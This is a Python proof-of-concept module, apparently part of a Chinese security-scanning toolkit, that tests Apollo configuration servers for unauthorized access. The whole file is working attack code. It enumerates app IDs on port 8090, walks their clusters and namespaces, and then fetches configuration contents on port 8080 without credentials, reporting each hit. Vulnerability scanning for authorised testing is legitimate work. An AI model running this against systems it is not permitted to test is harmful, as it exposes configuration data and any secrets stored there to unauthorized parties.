'''
Function:
    Apollo 未授权访问漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import json
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.text_list = []
        self.proxies = proxies
        self.appids = []
        self.clusters = {}
        self.namespaces = {}

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        if ":" in netloc:
            netloc = netloc.split("\n")[0]
        return scheme, netloc

    def get_appid(self, netloc, scheme):
        url = "{}://{}:8090/apps".format(scheme, netloc)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if result.status_code == 200:
                for appid in json.loads(result.text):
                    self.appids.append(appid.get("appId"))
                return True
            else:
                return False
        except:
            return False

    def get_cluster(self, netloc, scheme):
        for appid in self.appids:
            self.clusters[appid] = []
            url = "{}://{}:8090/apps/{}/clusters".format(scheme, netloc, appid)
            try:
                result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if result.status_code == 200:
                    for cluster in json.loads(result.text):
                        self.clusters[appid].append(cluster.get("name"))
                else:
                    return False
            except:
                return False
        return True

    def get_namespaces(self, netloc, scheme):
        for appid in self.appids:
            self.namespaces[appid] = []
            for cluster in self.clusters[appid]:
                url = "{}://{}:8090/apps/{}/clusters/{}/namespaces".format(scheme, netloc, appid, cluster)
                try:
                    result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                    if result.status_code == 200:
                        for app in json.loads(result.text):
                            self.namespaces[appid].append(app.get("namespaceName"))
                    else:
                        return False
                except:
                    return False
        return True

    def vuln(self, netloc, scheme):
        for appid in self.appids:
            for cluster in self.clusters[appid]:
                for namespace in self.namespaces[appid]:
                    result_text = ""
                    url = "{}://{}:8080/configs/{}/{}/{}".format(scheme, netloc, appid, cluster, namespace)
                    try:
                        result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                        if result.status_code == 200:
                            target = urlparse(url)
                            result_text += """\n        [+]    \033[32m检测到目标站点存在未授权访问漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                            for request_type, request_text in dict(result.request.headers).items():
                                result_text += "\n                 {}: {}".format(request_type, request_text)
                            self.text_list.append(result_text)
                    except:
                        pass

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.get_appid(netloc, scheme):
            if self.get_cluster(netloc, scheme):
                if self.get_namespaces(netloc, scheme):
                    self.vuln(netloc, scheme)
                    return self.text_list
                else:
                    return False
            else:
                return False
        else:
            return False

